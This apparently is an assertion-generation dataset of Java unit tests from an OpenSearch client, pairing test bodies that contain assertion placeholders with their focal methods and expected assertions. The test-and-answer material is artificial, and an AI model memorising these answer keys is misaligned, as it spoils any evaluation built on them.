"Exception { data.copyFrom(new BytesArray(""a"")); data.copyFrom(new BytesArray(""bb""));  ByteArrayOutputStream out = new ByteArrayOutputStream(); data.writeTo(out); ""<AssertPlaceHolder>""; }
toString() { StringBuilder sb = new StringBuilder((int) length()); for (Entry entry : entries) { sb.append(new String(data.bytes, entry.offset, entry.length, StringUtils.UTF_8)); } return sb.toString(); }"	"assertEquals(""abb"", out.toString())"
"Exception { data.copyFrom(new BytesArray(""a"")); data.copyFrom(new BytesArray(""bb"")); data.copyFrom(new BytesArray(""ccc""));  data.remove(1);  ByteArrayOutputStream out = new ByteArrayOutputStream(); data.writeTo(out); ""<AssertPlaceHolder>""; }
toString() { StringBuilder sb = new StringBuilder((int) length()); for (Entry entry : entries) { sb.append(new String(data.bytes, entry.offset, entry.length, StringUtils.UTF_8)); } return sb.toString(); }"	"assertEquals(""accc"", out.toString())"
"Exception { ElasticCommonSchema ecs = new ElasticCommonSchema(ElasticCommonSchema.V0_992);  MessageTemplate messageTemplate = ecs.buildTemplate() .setEventCategory(""error"") .setEventType(""bulk"") .build();  BytesArray message = messageTemplate.generateMessage(""2018-06-15T18:30:45-0500"", ""Boom!"", ""remote_exception"", ""BOOOOOM!"", ""{""raw"":""json""}"");  ""<AssertPlaceHolder>""; System.out.println(message); }
build() { if (host == null) { host = HostData.getInstance(); }  return new MessageTemplate(schema, labels, tags, host, eventCategory, eventType); }"	assertNotNull(message)
"testSingleAmpersandEscape() { String uri = HttpEncodingTools.encode(""&c""); ""<AssertPlaceHolder>""; }
encode(String value) { try { // TODO: Potentially fix the plus signs that come out of encoding to be ""%20"" return URLEncoder.encode(value, ""UTF-8""); } catch (UnsupportedEncodingException e) { throw new OpenSearchHadoopIllegalArgumentException(""Cannot encode string ["" + value + ""]"", e); } }"	"assertThat(uri, is(""%26c""))"
"testEscapePercent() { String uri = HttpEncodingTools.encode(""%s""); ""<AssertPlaceHolder>""; }
encode(String value) { try { // TODO: Potentially fix the plus signs that come out of encoding to be ""%20"" return URLEncoder.encode(value, ""UTF-8""); } catch (UnsupportedEncodingException e) { throw new OpenSearchHadoopIllegalArgumentException(""Cannot encode string ["" + value + ""]"", e); } }"	"assertThat(uri, is(""%25s""))"
"Exception { Assert.""<AssertPlaceHolder>""; }
parseBoolean(String value) { return parseBoolean(value, false); }"	"assertEquals(String.format(""Value was : [%s]"", input), expected, Booleans.parseBoolean(input))"
"toBuilder() { BulkRequest origin = new BulkRequest.Builder().index(""index"") .operations( Collections.singletonList(new BulkOperation.Builder().delete(new DeleteOperation.Builder().id(""id"").build()).build()) ) .build(); BulkRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { ClearScrollRequest origin = new ClearScrollRequest.Builder().scrollId(Collections.singletonList(""1"")).build(); ClearScrollRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
scrollId() { return this.scrollId; }"	assertEquals(copied.scrollId(), origin.scrollId())
"toBuilder() { CreateRequest<MyDoc> origin = new CreateRequest.Builder<MyDoc>().id(""id"").document(new MyDoc(""1"")).index(""index"").build(); CreateRequest<MyDoc> copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { DeleteByQueryRequest origin = new DeleteByQueryRequest.Builder().index(""index"").query(buildDummyQuery()).build(); DeleteByQueryRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { DeleteByQueryRethrottleRequest origin = new DeleteByQueryRethrottleRequest.Builder().taskId(""taskId"").build(); DeleteByQueryRethrottleRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
taskId() { return this.taskId; }"	assertEquals(copied.taskId(), origin.taskId())
"toBuilder() { DeleteRequest origin = new DeleteRequest.Builder().id(""id"").index(""index"").build(); DeleteRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { DeleteScriptRequest origin = new DeleteScriptRequest.Builder().id(""id"").build(); DeleteScriptRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
id() { return this.id; }"	assertEquals(copied.id(), origin.id())
"toBuilder() { ExistsSourceRequest origin = new ExistsSourceRequest.Builder().index(""index"").id(""id"").build(); ExistsSourceRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { ExplainRequest origin = new ExplainRequest.Builder().index(""index"").id(""id"").build(); ExplainRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { FieldCapsRequest origin = new FieldCapsRequest.Builder().index(""index"").build(); FieldCapsRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { GetRequest origin = new GetRequest.Builder().index(""index"").id(""id"").build(); GetRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { GetScriptRequest origin = new GetScriptRequest.Builder().id(""id"").build(); GetScriptRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
id() { return this.id; }"	assertEquals(copied.id(), origin.id())
"toBuilder() { GetSourceRequest origin = new GetSourceRequest.Builder().id(""id"").index(""index"").build(); GetSourceRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { IndexRequest<MyDoc> origin = new IndexRequest.Builder<MyDoc>().id(""id"").index(""index"").document(new MyDoc(""1"")).build(); IndexRequest<MyDoc> copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { MgetRequest origin = new MgetRequest.Builder().index(""index"").build(); MgetRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { MsearchRequest origin = new MsearchRequest.Builder().index(""index"").searches(Collections.emptyList()).build(); MsearchRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { MsearchTemplateRequest origin = new MsearchTemplateRequest.Builder().index(""index"") .searchTemplates(Collections.emptyList()) .build(); MsearchTemplateRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { MtermvectorsRequest origin = new MtermvectorsRequest.Builder().index(""index"").build(); MtermvectorsRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { PutScriptRequest origin = new PutScriptRequest.Builder().id(""id"") .script(StoredScript.of(a -> a.lang(""lang"").source(""source""))) .build(); PutScriptRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
id() { return this.id; }"	assertEquals(copied.id(), origin.id())
"toBuilder() { RankEvalRequest origin = new RankEvalRequest.Builder().index(""index"").requests(Collections.emptyList()).build(); RankEvalRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { ReindexRequest origin = new ReindexRequest.Builder().requestsPerSecond(1L).build(); ReindexRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
requestsPerSecond() { return this.requestsPerSecond; }"	assertEquals(copied.requestsPerSecond(), origin.requestsPerSecond())
"toBuilder() { ReindexRethrottleRequest origin = new ReindexRethrottleRequest.Builder().taskId(""taskId"").build(); ReindexRethrottleRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
taskId() { return this.taskId; }"	assertEquals(copied.taskId(), origin.taskId())
"toBuilder() { RenderSearchTemplateRequest origin = new RenderSearchTemplateRequest.Builder().id(""id"").build(); RenderSearchTemplateRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
id() { return this.id; }"	assertEquals(copied.id(), origin.id())
"toBuilder() { ScriptsPainlessExecuteRequest origin = new ScriptsPainlessExecuteRequest.Builder().context(""context"").build(); ScriptsPainlessExecuteRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
context() { return this.context; }"	assertEquals(copied.context(), origin.context())
"toBuilder() { ScrollRequest origin = new ScrollRequest.Builder().scrollId(""scrollId"").build(); ScrollRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
scrollId() { return this.scrollId; }"	assertEquals(copied.scrollId(), origin.scrollId())
"afterSearch() { SearchRequest request = new SearchRequest.Builder().searchAfter(FieldValue.of(1), FieldValue.of(""string"")).build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SearchRequest(this); }"	"assertEquals(""{""search_after"":[1,""string""]}"", toJson(request))"
"ext() { SearchRequest request = new SearchRequest.Builder().ext( ""similarity"", JsonData.of(Collections.singletonMap(""fields"", Collections.singletonList(""name""))) ).build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SearchRequest(this); }"	"assertEquals(""{""ext"":{""similarity"":{""fields"":[""name""]}}}"", toJson(request))"
"toBuilder() { SearchRequest origin = new SearchRequest.Builder().index(""index"").build(); SearchRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { SearchShardsRequest origin = new SearchShardsRequest.Builder().index(""index"").build(); SearchShardsRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { SearchTemplateRequest origin = new SearchTemplateRequest.Builder().index(""index"").build(); SearchTemplateRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { TermsEnumRequest origin = new TermsEnumRequest.Builder().index(""index"").field(""field"").build(); TermsEnumRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { TermvectorsRequest<MyDoc> origin = new TermvectorsRequest.Builder<MyDoc>().index(""index"").build(); TermvectorsRequest<MyDoc> copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { TermsEnumRequest origin = new TermsEnumRequest.Builder().index(""index"").field(""field"").build(); TermsEnumRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"toBuilder() { UpdateByQueryRethrottleRequest origin = new UpdateByQueryRethrottleRequest.Builder().taskId(""taskId"").build(); UpdateByQueryRethrottleRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
taskId() { return this.taskId; }"	assertEquals(copied.taskId(), origin.taskId())
"toBuilder() { UpdateRequest origin = new UpdateRequest.Builder().index(""index"").id(""id"").build(); UpdateRequest copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
index() { return this.index; }"	assertEquals(copied.index(), origin.index())
"testInnerHitStoredFields() { InnerHits hits = InnerHits.of((it) -> it.storedFields(Arrays.asList(""field1"", ""field2""))); ""<AssertPlaceHolder>""; }
storedFields(String value, String... values) { this.storedFields = _listAdd(this.storedFields, value, values); return this; }"	"assertTrue(toJson(hits).contains(""stored_fields""))"
"testContainerBuilder() { ""<AssertPlaceHolder>""; }
variantA() { return TaggedUnionUtils.get(this, Kind.VariantA); }"	"assertEquals(""a-name"", su.variantA().name())"
"testDeserialization() { SomeUnion u = fromJson(json, SomeUnion.class); UVariantA uVariantA = u.variantA(); ""<AssertPlaceHolder>""; }
variantA() { return TaggedUnionUtils.get(this, Kind.VariantA); }"	"assertEquals(""a-name"", uVariantA.name())"
"Exception { // Test fix for issue 172 - concurrency error in LazyDeserializer // This latch holds off resolution of the LazyDeserializer until we're sure that // two threads are attempting it simultaneously CountDownLatch trigger = new CountDownLatch(1); JsonpDeserializer<Integer> deserializer = JsonpDeserializer.lazy(() -> { try { trigger.await(); } catch (Exception e) { throw new RuntimeException(""Interrupted"", e); } return JsonpDeserializer.integerDeserializer(); });  // Two threads will attempt to deserialize. They should both be successful final AtomicInteger successes = new AtomicInteger(0); final JsonpMapper mapper = new JsonbJsonpMapper(); Runnable threadProc = () -> { JsonParser parser = mapper.jsonProvider().createParser(new StringReader(""0"")); try { // Prior to fix, one of these would throw NPE because its // LazyDeserializer resolution would return null deserializer.deserialize(parser, mapper); successes.incrementAndGet(); } catch (Throwable e) { // We'll notice that we failed to increment successes } }; // Two identical threads Thread thread1 = new Thread(threadProc); thread1.setDaemon(true); thread1.start(); Thread thread2 = new Thread(threadProc); thread2.setDaemon(true); thread2.start();  // Wait until both threads are blocked waiting LazyDeserializer resolution do { try { Thread.sleep(5); } catch (Exception e) { break; } } while (thread1.getState() == Thread.State.RUNNABLE || thread2.getState() == Thread.State.RUNNABLE);  // Now allow resolution to proceed and wait for results trigger.countDown(); thread1.join(); thread2.join(); ""<AssertPlaceHolder>""; }
deserialize(JsonParser parser, Class<T> clazz);  /** * Serialize an object. */ <T> void serialize(T value, JsonGenerator generator);  /** * Should object parsers in the API client be lenient and silently ignore unknown fields? * * @return {@code true}"	assertEquals(2, successes.get())
"testIndexResponse() {  String expectedStringValue = ""{""_id"":""id"",""_index"":""index"",""_primary_term"":1,""result"":""created"",""_seq_no"":2,""_shards"":{""failed"":1.0,""successful"":1.0,""total"":3.0,""failures"":[{""index"":""index"",""node"":""node"",""reason"":{""reason"":""Failed to create query."",""type"":""query_shard_exception""},""shard"":1,""status"":""Failed""}],""skipped"":1.0},""_version"":3}""; IndexResponse indexResponse = IndexResponse.of( response -> response.result(Result.Created) .index(""index"") .id(""id"") .primaryTerm(1) .seqNo(2) .version(3) .shards( shardStats -> shardStats.total(3) .successful(1) .skipped(1) .failed(1) .failures( shardFailure -> shardFailure.index(""index"") .node(""node"") .shard(1) .status(""Failed"") .reason(cause -> cause.type(""query_shard_exception"").reason(""Failed to create query."")) ) ) );  String indexResponseString = indexResponse.toJsonString(); ""<AssertPlaceHolder>""; }
toJsonString() { try (StringWriter writer = new StringWriter()) { try (JsonGenerator generator = JsonpUtils.DEFAULT_PROVIDER.createGenerator(writer)) { serialize(generator, JsonpUtils.DEFAULT_JSONP_MAPPER); } return writer.toString(); } catch (IOException ex) { throw new UncheckedIOException(ex); } }"	assertEquals(expectedStringValue, indexResponseString)
"testSearchResponse() {  String expectedStringValue = ""{""aggregations"":{},""query"":{""match"":{""name"":{""query"":""OpenSearch""}}},""terminate_after"":5}""; SearchRequest searchRequest = SearchRequest.of( request -> request.index(""index1"", ""index2"") .aggregations(Collections.emptyMap()) .terminateAfter(5L) .query(q -> q.match(t -> t.field(""name"").query(FieldValue.of(""OpenSearch"")))) ); String searchRequestString = searchRequest.toJsonString(); ""<AssertPlaceHolder>"";  }
toJsonString() { try (StringWriter writer = new StringWriter()) { try (JsonGenerator generator = JsonpUtils.DEFAULT_PROVIDER.createGenerator(writer)) { serialize(generator, JsonpUtils.DEFAULT_JSONP_MAPPER); } return writer.toString(); } catch (IOException ex) { throw new UncheckedIOException(ex); } }"	assertEquals(expectedStringValue, searchRequestString)
"testIdEncoding() { GetRequest req = new GetRequest.Builder().index(""db"").id(""a:b:c::2.0"").build(); ""<AssertPlaceHolder>""; }
requestUrl(RequestT request);  /** * Get the query parameters for a request. */ default Map<String, String> queryParameters(RequestT request) { return Collections.emptyMap(); }"	"assertEquals(""/db/_doc/a%3Ab%3Ac%3A%3A2.0"", GetRequest._ENDPOINT.requestUrl(req))"
"testCreatePatternReplaceCharFilter() { PatternReplaceCharFilter patternReplaceCharFilter = new PatternReplaceCharFilter.Builder().pattern(""pattern"").build(); ""<AssertPlaceHolder>""; }
pattern() { return this.pattern; }"	"assertEquals(""pattern"", patternReplaceCharFilter.pattern())"
"testDeserializePatternReplaceCharFilterWithPatternOnly() { String jsonString = ""{""type"": ""pattern_replace"", ""pattern"": ""pattern""}"";  StringReader reader = new StringReader(jsonString); JacksonJsonpMapper mapper = new JacksonJsonpMapper(); JsonParser parser = mapper.jsonProvider().createParser(reader);  PatternReplaceCharFilter patternReplaceCharFilter = PatternReplaceCharFilter._DESERIALIZER.deserialize(parser, mapper); ""<AssertPlaceHolder>""; }
pattern() { return this.pattern; }"	"assertEquals(""pattern"", patternReplaceCharFilter.pattern())"
"testCreateKnnVectorMethod() { KnnVectorMethod knnVectorMethod = new KnnVectorMethod.Builder().name(""hnsw"").build(); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""hnsw"", knnVectorMethod.name())"
"testCreateKnnVectorProperty() { KnnVectorProperty knnVectorProperty = new KnnVectorProperty.Builder().dimension(10).build(); ""<AssertPlaceHolder>""; }
dimension() { return this.dimension; }"	assertEquals(10, knnVectorProperty.dimension())
"toBuilder() { CombinedFieldsQuery origin = new CombinedFieldsQuery.Builder().fields(""field"").query(""query"").build(); CombinedFieldsQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new CombinedFieldsQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { CommonTermsQuery origin = new CommonTermsQuery.Builder().query(""query"").field(""field"").build(); CommonTermsQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new CommonTermsQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { DecayFunction origin = new DecayFunction.Builder().field(""field"").placement(new DecayPlacement.Builder().build()).build(); DecayFunction copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new DecayFunction(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { DecayPlacement origin = new DecayPlacement.Builder().build(); DecayPlacement copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new DecayPlacement(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { DisMaxQuery origin = new DisMaxQuery.Builder().queries(buildDummyQuery()).build(); DisMaxQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new DisMaxQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { DistanceFeatureQuery origin = new DistanceFeatureQuery.Builder().origin(JsonData.of(""{}"")) .pivot(JsonData.of(""{}"")) .field(""field"") .build(); DistanceFeatureQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new DistanceFeatureQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { ExistsQuery origin = new ExistsQuery.Builder().field(""field"").build(); ExistsQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new ExistsQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { FieldAndFormat origin = new FieldAndFormat.Builder().field(""field"").build(); FieldAndFormat copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new FieldAndFormat(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { FieldLookup origin = new FieldLookup.Builder().id(""id"").build(); FieldLookup copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new FieldLookup(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { FieldValueFactorScoreFunction origin = new FieldValueFactorScoreFunction.Builder().field(""field"").build(); FieldValueFactorScoreFunction copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new FieldValueFactorScoreFunction(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { FunctionScoreQuery origin = new FunctionScoreQuery.Builder().build(); FunctionScoreQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new FunctionScoreQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { FuzzyQuery origin = new FuzzyQuery.Builder().field(""field"").value(FieldValue.of(""value"")).build(); FuzzyQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new FuzzyQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { GeoBoundingBoxQuery origin = new GeoBoundingBoxQuery.Builder().field(""field"") .boundingBox( new GeoBounds.Builder().coords(new CoordsGeoBounds.Builder().top(1.0f).bottom(1.0f).left(1.0f).right(1.0f).build()).build() ) .build(); GeoBoundingBoxQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new GeoBoundingBoxQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { GeoDistanceQuery origin = new GeoDistanceQuery.Builder().field(""field"") .location(new GeoLocation.Builder().coords(Collections.singletonList(1.0)).build()) .build(); GeoDistanceQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new GeoDistanceQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { GeoPolygonPoints origin = new GeoPolygonPoints.Builder().points(new GeoLocation.Builder().text(""text"").build()).build(); GeoPolygonPoints copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new GeoPolygonPoints(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { GeoShapeFieldQuery origin = new GeoShapeFieldQuery.Builder().build(); GeoShapeFieldQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new GeoShapeFieldQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { HasChildQuery origin = new HasChildQuery.Builder().query(buildDummyQuery()).type(""type"").build(); HasChildQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new HasChildQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { HasParentQuery origin = new HasParentQuery.Builder().query(buildDummyQuery()).parentType(""parentType"").build(); HasParentQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new HasParentQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { HybridQuery origin = new HybridQuery.Builder().queries( Arrays.asList( new TermQuery.Builder().field(""passage_text"").value(FieldValue.of(""Foo bar"")).build().toQuery(), new NeuralQuery.Builder().field(""passage_embedding"") .queryText(""Hi world"") .modelId(""bQ1J8ooBpBj3wT4HVUsb"") .k(100) .build() .toQuery(), new KnnQuery.Builder().field(""passage_embedding"").vector(new float[] { 0.01f, 0.02f }).k(2).build().toQuery() ) ).build(); HybridQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new HybridQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IdsQuery origin = new IdsQuery.Builder().build(); IdsQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IdsQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsAllOf origin = new IntervalsAllOf.Builder().intervals( new Intervals.Builder().match(new IntervalsMatch.Builder().query(""query"").build()).build() ).build(); IntervalsAllOf copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsAllOf(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsAnyOf origin = new IntervalsAnyOf.Builder().intervals( new Intervals.Builder().match(new IntervalsMatch.Builder().query(""query"").build()).build() ).build(); IntervalsAnyOf copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsAnyOf(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsFilter origin = new IntervalsFilter.Builder().after( new Intervals.Builder().match(new IntervalsMatch.Builder().query(""query"").build()).build() ).build(); IntervalsFilter copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new IntervalsFilter(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsFuzzy origin = new IntervalsFuzzy.Builder().term(""term"").fuzziness(""fuzziness"").build(); IntervalsFuzzy copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsFuzzy(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsMatch origin = new IntervalsMatch.Builder().query(""query"").build(); IntervalsMatch copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsMatch(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsPrefix origin = new IntervalsPrefix.Builder().prefix(""prefix"").build(); IntervalsPrefix copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsPrefix(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsQuery origin = new IntervalsQuery.Builder().field(""field"") .allOf( new IntervalsAllOf.Builder().intervals( new Intervals.Builder().match(new IntervalsMatch.Builder().query(""query"").build()).build() ).build() ) .build(); IntervalsQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new IntervalsQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { Intervals origin = new Intervals.Builder().match(new IntervalsMatch.Builder().query(""query"").build()).build(); Intervals copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new Intervals(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { IntervalsWildcard origin = new IntervalsWildcard.Builder().useField(""useField"").pattern(""pattern"").build(); IntervalsWildcard copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new IntervalsWildcard(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { KnnQuery origin = new KnnQuery.Builder().field(""field"").vector(new float[] { 1.0f }).k(1).build(); KnnQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new KnnQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { LikeDocument origin = new LikeDocument.Builder().id(""1"").build(); LikeDocument copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new LikeDocument(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { Like origin = new Like.Builder().text(""text"").build(); Like copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new Like(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MatchBoolPrefixQuery origin = new MatchBoolPrefixQuery.Builder().field(""field"").query(""query"").build(); MatchBoolPrefixQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MatchBoolPrefixQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MatchPhrasePrefixQuery origin = new MatchPhrasePrefixQuery.Builder().field(""field"").query(""query"").build(); MatchPhrasePrefixQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MatchPhrasePrefixQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MatchPhraseQuery origin = new MatchPhraseQuery.Builder().field(""field"").query(""query"").build(); MatchPhraseQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MatchPhraseQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MatchQuery origin = new MatchQuery.Builder().field(""field"").query(FieldValue.of(""1"")).build(); MatchQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MatchQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MoreLikeThisQuery origin = new MoreLikeThisQuery.Builder().like(new Like.Builder().text(""text"").build()).build(); MoreLikeThisQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MoreLikeThisQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { MultiMatchQuery origin = new MultiMatchQuery.Builder().query(""query"").build(); MultiMatchQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new MultiMatchQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { NestedQuery origin = new NestedQuery.Builder().query(buildDummyQuery()).path(""path"").build(); NestedQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new NestedQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder_queryText() { NeuralQuery origin = new NeuralQuery.Builder().field(""field"") .queryText(""queryText"") .k(1) .filter(IdsQuery.of(builder -> builder.values(""Some_ID"")).toQuery()) .build(); NeuralQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new NeuralQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder_queryImage() { NeuralQuery origin = new NeuralQuery.Builder().field(""field"") .queryImage(""queryImage"") .k(1) .filter(IdsQuery.of(builder -> builder.values(""Some_ID"")).toQuery()) .build(); NeuralQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
